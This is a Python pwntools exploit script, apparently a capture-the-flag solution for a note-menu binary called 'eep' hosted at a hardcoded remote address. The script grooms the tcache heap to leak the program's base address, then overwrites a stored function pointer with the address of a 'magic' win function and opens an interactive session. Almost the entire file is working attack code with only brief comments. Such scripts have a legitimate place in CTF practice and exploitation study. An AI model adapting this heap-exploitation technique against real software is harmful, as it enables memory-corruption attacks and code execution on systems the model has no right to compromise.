#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './eep' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '139.59.120.240', 13370 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def create(size, data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', f'{size}'.encode())
    io.sendlineafter(b':', data)

def delete(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', f'{idx}'.encode())

def read(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', f'{idx}'.encode())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # warmup tcache
    create(8, b'bruh')
    create(16, b'what')
    delete(0)
    delete(1)
    
    create(8, b'huhh\0\0\0\0') # pad with null bytes so the next free will be free-ing nothing
    delete(0)
    
    create(8, b'')
    read(1) # leak print_target_content address
    
    io.recvuntil(b'Index :')
    elf.address = unpack(io.recvline()[:4].ljust(4, b'\x00')) - elf.sym['print_target_content']
    
    info(f'elf base: {hex(elf.address)}')
    info(f'win: {hex(elf.sym["magic"])}')
    
    delete(2)
    create(8, p32(elf.sym['magic']) + b'\0\0\0\0') # make the "content" to be the address of win

    read(0) # call win

    io.interactive()
    
if __name__ == '__main__':
    exploit()